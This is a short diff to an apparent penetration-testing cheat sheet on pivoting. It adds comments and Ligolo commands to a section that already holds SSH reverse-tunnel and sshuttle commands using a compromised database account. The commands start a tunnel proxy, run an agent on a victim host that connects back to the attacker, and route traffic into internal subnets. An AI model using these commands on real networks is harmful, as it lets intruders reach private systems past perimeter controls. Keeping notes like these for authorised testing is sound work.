@@ -50,9 +50,14 @@ ssh -N -R $LPORT kali@kali-ip
 ===SSHUTTLE
 sshuttle -r database_admin@192.168.238.63:2222 10.4.238.0/24 172.16.238.0/24
 ===LIGOLO
+#Starting proxy
 sudo ip tuntap add user kali mode tun ligolo;sudo ip link set ligolo up;proxy -selfcert -laddr 0.0.0.0:443
+#Starting Agent
 .\agent.exe -connect $LHOST:443 -ignore-cert
+#Adding route to internal network
 sudo ip route add 172.16.201.0/24 dev ligolo
+#For local port forwarding
+sudo ip route add 240.0.0.1/24 dev ligolo
 
 ================================================================================
 ===Nmap====
